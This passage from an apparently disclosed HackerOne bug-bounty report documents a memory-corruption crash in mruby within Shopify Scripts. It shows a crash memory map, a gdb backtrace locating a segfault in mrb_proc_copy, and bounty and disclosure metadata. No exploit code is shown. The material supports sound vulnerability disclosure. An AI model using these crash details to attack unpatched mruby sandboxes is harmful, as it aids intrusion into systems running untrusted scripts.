r--p 00004000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7fdcc3d92000-7fdcc3d93000 rw-p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7fdcc3d93000-7fdcc3d94000 r-xp 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7fdcc3d94000-7fdcc3f93000 ---p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7fdcc3f93000-7fdcc3f94000 r--p 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7fdcc3f94000-7fdcc3f95000 rw-p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7fdcc3f95000-7fdcc3f96000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7fdcc3f96000-7fdcc4196000 ---p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7fdcc4196000-7fdcc4197000 r--p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7fdcc4197000-7fdcc4198000 rw-p 00002000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7fdcc4198000-7fdcc419b000 r-xp 00000000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7fdcc419b000-7fdcc439a000 ---p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7fdcc439a000-7fdcc439b000 r--p 00002000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7fdcc439b000-7fdcc439c000 rw-p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7fdcc439c000-7fdcc45ea000 r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7fdcc45ea000-7fdcc47e9000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7fdcc47e9000-7fdcc4805000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7fdcc4805000-7fdcc4811000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7fdcc4811000-7fdcc4814000 rw-p 00000000 00:00 0 \n7fdcc4814000-7fdcc487b000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7fdcc487b000-7fdcc4a7a000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7fdcc4a7a000-7fdcc4a7e000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7fdcc4a7e000-7fdcc4a85000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7fdcc4a85000-7fdcc4ad4000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7fdcc4ad4000-7fdcc4cd4000 ---p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7fdcc4cd4000-7fdcc4cd6000 r--p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7fdcc4cd6000-7fdcc4cd8000 rw-p 00051000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7fdcc4cd8000-7fdcc4cd9000 rw-p 00000000 00:00 0 \n7fdcc4cd9000-7fdcc4cda000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7fdcc4cda000-7fdcc4eda000 ---p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7fdcc4eda000-7fdcc4edb000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7fdcc4edb000-7fdcc4edc000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7fdcc4edc000-7fdcc4f0b000 r-xp 00000000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7fdcc4f0b000-7fdcc510b000 ---p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7fdcc510b000-7fdcc510c000 r--p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7fdcc510c000-7fdcc510d000 rw-p 00030000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7fdcc510d000-7fdcc510e000 rw-p 00000000 00:00 0 \n7fdcc510e000-7fdcc5111000 r-xp 00000000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7fdcc5111000-7fdcc5310000 ---p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7fdcc5310000-7fdcc5311000 r--p 00002000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7fdcc5311000-7fdcc5312000 rw-p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7fdcc5312000-7fdcc5327000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7fdcc5327000-7fdcc5526000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7fdcc5526000-7fdcc5527000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7fdcc5527000-7fdcc5528000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7fdcc5528000-7fdcc5535000 r-xp 00000000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7fdcc5535000-7fdcc5734000 ---p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7fdcc5734000-7fdcc5735000 r--p 0000c000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7fdcc5735000-7fdcc5736000 rw-p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7fdcc5736000-7fdcc5738000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7fdcc5738000-7fdcc5937000 ---p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7fdcc5937000-7fdcc5938000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7fdcc5938000-7fdcc5939000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7fdcc5939000-7fdcc5963000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7fdcc5963000-7fdcc5b62000 ---p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7fdcc5b62000-7fdcc5b63000 r--p 00029000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7fdcc5b63000-7fdcc5b64000 rw-p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7fdcc5b64000-7fdcc5b6a000 r-xp 00000000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7fdcc5b6a000-7fdcc5d69000 ---p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7fdcc5d69000-7fdcc5d6a000 r--p 00005000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7fdcc5d6a000-7fdcc5d6b000 rw-p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7fdcc5d6b000-7fdcc5d6f000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7fdcc5d6f000-7fdcc5f6e000 ---p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7fdcc5f6e000-7fdcc5f6f000 r--p 00003000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7fdcc5f6f000-7fdcc5f70000 rw-p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7fdcc5f70000-7fdcc5f76000 r-xp 00000000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7fdcc5f76000-7fdcc6175000 ---p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7fdcc6175000-7fdcc6176000 r--p 00005000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7fdcc6176000-7fdcc6177000 rw-p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7fdcc6177000-7fdcc617e000 r-xp 00000000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7fdcc617e000-7fdcc637d000 ---p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7fdcc637d000-7fdcc637e000 r--p 00006000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7fdcc637e000-7fdcc637f000 rw-p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7fdcc637f000-7fdcc6381000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7fdcc6381000-7fdcc6581000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7fdcc6581000-7fdcc6582000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7fdcc6582000-7fdcc6583000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7fdcc6583000-7fdcc6585000 r-xp 00000000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7fdcc6585000-7fdcc6784000 ---p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7fdcc6784000-7fdcc6785000 r--p 00001000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7fdcc6785000-7fdcc6786000 rw-p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7fdcc6786000-7fdcc6887000 rw-p 00000000 00:00 0 \n7fdcc6887000-7fdcc698a000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so\n7fdcc698a000-7fdcc6b89000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n7fdcc6b89000-7fdcc6b8a000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so\n7fdcc6b8a000-7fdcc6b8b000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n7fdcc6b8b000-7fdcc6b93000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7fdcc6b93000-7fdcc6d93000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7fdcc6d93000-7fdcc6d94000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7fdcc6d94000-7fdcc6d95000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7fdcc6d95000-7fdcc6dc3000 rw-p 00000000 00:00 0 \n7fdcc6dc3000-7fdcc6dc5000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so\n7fdcc6dc5000-7fdcc6fc5000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n7fdcc6fc5000-7fdcc6fc6000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n7fdcc6fc6000-7fdcc6fc7000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so\n7fdcc6fc7000-7fdcc7059000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7fdcc7059000-7fdcc7258000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7fdcc7258000-7fdcc7259000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7fdcc7259000-7fdcc725a000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7fdcc725a000-7fdcc7272000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7fdcc7272000-7fdcc7471000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7fdcc7471000-7fdcc7472000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7fdcc7472000-7fdcc7473000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7fdcc7473000-7fdcc7477000 rw-p 00000000 00:00 0 \n7fdcc7477000-7fdcc760c000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n7fdcc760c000-7fdcc780b000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so\n7fdcc780b000-7fdcc780f000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so\n7fdcc780f000-7fdcc7811000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so\n7fdcc7811000-7fdcc7815000 rw-p 00000000 00:00 0 \n7fdcc7815000-7fdcc7a89000 r-xp 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n7fdcc7a89000-7fdcc7c88000 ---p 00274000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n7fdcc7c88000-7fdcc7c8e000 r--p 00273000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n7fdcc7c8e000-7fdcc7c91000 rw-p 00279000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n7fdcc7c91000-7fdcc7ca2000 rw-p 00000000 00:00 0 \n7fdcc7ca2000-7fdcc7cc5000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so\n7fdcc7d16000-7fdcc7eae000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive\n7fdcc7eae000-7fdcc7eb4000 rw-p 00000000 00:00 0 \n7fdcc7ebe000-7fdcc7ec0000 r--s 00000000 08:03 948907                     /usr/bin/ruby\n7fdcc7ec0000-7fdcc7ec1000 ---p 00000000 00:00 0 \n7fdcc7ec1000-7fdcc7ec4000 rw-p 00000000 00:00 0 \n7fdcc7ec4000-7fdcc7ec5000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so\n7fdcc7ec5000-7fdcc7ec6000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so\n7fdcc7ec6000-7fdcc7ec7000 rw-p 00000000 00:00 0 \n7ffd405b1000-7ffd40db0000 rw-p 00000000 00:00 0                          [stack]\n7ffd40dc4000-7ffd40dc6000 r--p 00000000 00:00 0                          [vvar]\n7ffd40dc6000-7ffd40dc8000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\n[1]    10951 abort (core dumped)  bin/sandbox crashes/proc_crash.mrb\n```\n\ngdb:\n```\n$ gdb attach `pidof ruby`\nGNU gdb (GDB) 7.12\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-pc-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nattach: No such file or directory.\nAttaching to process 11091\n[New LWP 11092]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/usr/lib/libthread_db.so.1\".\n0x00007fb39fc594b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n(gdb) c\nContinuing.\n[New Thread 0x7fb39ae43700 (LWP 11151)]\n\nThread 3 \"ruby\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7fb39ae43700 (LWP 11151)]\nmrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144\n144\t    a-\u003ebody.irep-\u003erefcnt++;\n(gdb) bt\n#0  mrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144\n#1  0x00007fb39c2de7be in mrb_proc_init_copy (mrb=0x7fb39ae444e0, self=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175\n#2  0x00007fb39c2cce4f in mrb_vm_exec (mrb=mrb@entry=0x7fb39ae444e0, proc=\u003coptimized out\u003e, proc@entry=0x7fb39ae4c580, pc=\u003coptimized out\u003e)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#3  0x00007fb39c2d2697 in mrb_vm_run (mrb=0x7fb39ae444e0, proc=0x7fb39ae4c580, self=..., stack_keep=stack_keep@entry=0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007fb39c2b3613 in mruby_engine_monitored_eval (data=0x7fb39ae443e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007fb39fc53454 in start_thread () from /usr/lib/libpthread.so.0\n#6  0x00007fb39ff517df in clone () from /usr/lib/libc.so.6\n(gdb) info registers\nrax            0x0\t0\nrbx            0x7fb39ae4c520\t140409374557472\nrcx            0x0\t0\nrdx            0x0\t0\nrsi            0x7fb39ae4c490\t140409374557328\nrdi            0x7fb39ae4c520\t140409374557472\nrbp            0x7fb39ae444e0\t0x7fb39ae444e0\nrsp            0x7fb39ae42aa8\t0x7fb39ae42aa8\nr8             0x7fb39ae52560\t140409374582112\nr9             0x1\t1\nr10            0x0\t0\nr11            0x0\t0\nr12            0x7fb39ae4c520\t140409374557472\nr13            0x4d\t77\nr14            0x7fb39ae444e0\t140409374524640\nr15            0x7fb39ae4eb60\t140409374567264\nrip            0x7fb39c2de605\t0x7fb39c2de605 \u003cmrb_proc_copy+37\u003e\neflags         0x10246\t[ PF ZF IF RF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\ngs             0x0\t0\n(gdb) \n```","bounty_amount":"8000.0","formatted_bounty":"$8,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-15T20:27:15.725Z","allow_singular_disclosure_after":-149448523.98503312,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","linkks","spetr0x"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1318356,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.","automated_response":false,"created_at":"2016-11-24T20:57:07.610Z","updated_at":"2016-11-24T20:57:07.610Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1319963,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for reporting this issue @brakhane. As I mentioned on your other issue, we've shipped a fix to our production environment.","automated_response":false,"created_at":"2016-11-25T21:46:47.000Z","updated_at":"2016-11-25T21:46:47.000Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"brakhane","url":"/brakhane"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370186,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","automated_response":false,"created_at":"2016-12-16T20:27:08.779Z","updated_at":"2016-12-16T20:27:08.779Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"8000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"brakhane","url":"/brakhane"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370187,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-16T20:27:15.693Z","updated_at":"2016-12-16T20:27:15.693Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370412,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the awesome bounty and the fun! Always a pleasure!","automated_response":false,"created_at":"2016-12-16T22:18:58.651Z","updated_at":"2016-12-16T22:18:58.651Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370413,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-12-16T22:18:59.131Z","updated_at":"2016-12-16T22:18:59.131Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}